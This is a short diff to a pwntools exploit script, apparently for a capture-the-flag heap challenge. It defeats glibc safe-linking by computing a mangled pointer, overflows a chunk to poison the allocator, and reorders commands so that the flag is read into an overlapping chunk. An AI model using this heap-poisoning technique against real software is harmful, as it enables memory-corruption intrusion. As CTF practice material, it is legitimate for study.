@@ -58,22 +58,25 @@ p.sendline("free 2")
 
 
 # get the flag chunk
-p.sendline("read_flag")
+
 
 # defeat safe linking
 
 flag_chunk = heap_leak + 0xb60
 chunk_addr = heap_leak + 0x300
-mangled_ptr = ((chunk_addr >> 12) ^ flag_chunk)
+mangled_ptr = ((chunk_addr >> 12) ^ (flag_chunk))
 # Overwrite from chunk D
 p.sendline("read_copy 11")
 p.sendline(b'A' * 0x30 + p64(mangled_ptr)) # pwndbg> x/x 0x5571fdbb9300 - 0x5571fdbb92d0 = 0x30 
 
+
+
 p.sendline("malloc 13 40")
 p.sendline("malloc 14 40") # only prints part of the flag
+p.sendline("read_flag")
 p.sendline("puts 14")
 
-#gdb.attach(p, s)
+
 
 
 
